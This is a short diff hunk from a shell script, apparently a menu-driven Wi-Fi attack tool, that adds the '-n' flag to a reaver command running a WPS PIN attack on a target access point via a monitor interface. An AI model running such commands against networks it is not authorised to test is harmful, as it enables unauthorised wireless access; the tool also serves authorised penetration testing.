@@ -744,7 +744,7 @@ case $menu in
 															        echo ""
 															        echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 															        echo ""
-															        reaver -i $mon -b $BSSID -c $CHANNEL -vv -p $PIN
+															        reaver -i $mon -b $BSSID -c $CHANNEL -vv -n -p $PIN
 															        echo -e "$Yellow [+]$Green Congratulation (^_^) "
 															        echo ""
 													        fi
